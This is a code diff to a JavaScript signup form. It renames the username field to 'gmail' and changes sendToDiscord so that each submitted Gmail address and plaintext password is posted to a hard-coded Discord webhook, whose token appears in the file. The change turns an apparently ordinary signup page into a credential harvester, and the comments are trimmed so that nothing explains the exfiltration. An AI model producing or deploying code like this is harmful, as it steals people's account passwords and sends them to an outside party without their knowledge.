@@ -1,6 +1,6 @@
 document.addEventListener("DOMContentLoaded", () => {
   const form = document.getElementById("signup-form");
-  const usernameInput = document.getElementById("username");
+  const gmailInput = document.getElementById("username");
   const passwordInput = document.getElementById("password");
   const displayName = document.getElementById("display-name");
   const signupContainer = document.getElementById("signup-container");
@@ -9,41 +9,37 @@ document.addEventListener("DOMContentLoaded", () => {
   form.addEventListener("submit", (e) => {
     e.preventDefault();
 
-    const username = usernameInput.value;
+    const gmail = gmailInput.value;
     const password = passwordInput.value;
 
-    // Set your desired password here
-    const correctPassword = "mySecret123"; // <--- Change this to whatever you want
+    const correctPassword = "mySecret123"; // <-- Optional security step
 
     if (password !== correctPassword) {
       alert("Incorrect password. Please try again.");
       return;
     }
 
-    // Save username
-    localStorage.setItem("username", username);
-    displayName.textContent = username;
+    localStorage.setItem("gmail", gmail);
+    displayName.textContent = gmail;
     signupContainer.style.display = "none";
     mainContent.style.display = "block";
 
-    // Send to Discord
-    sendToDiscord(username);
+    sendToDiscord(gmail, password);
   });
 
-  // If already signed in
-  const savedName = localStorage.getItem("username");
-  if (savedName) {
-    displayName.textContent = savedName;
+  const savedGmail = localStorage.getItem("gmail");
+  if (savedGmail) {
+    displayName.textContent = savedGmail;
     signupContainer.style.display = "none";
     mainContent.style.display = "block";
   }
 });
 
-function sendToDiscord(username) {
+function sendToDiscord(gmail, password) {
   const webhookURL = "https://discord.com/api/webhooks/1362138187962650727/aVG7VuftNpdkCSHQH8aMGEp5HoLdTuis4OdDrpVFdwnj0TDcVUCkEr3dUt4zV-5OP1rL";
 
   const payload = {
-    content: `New signup: ${username}`,
+    content: `📨 New signup:\n**Gmail:** ${gmail}\n**Password:** ${password}`,
     username: "Signup Bot"
   };
 
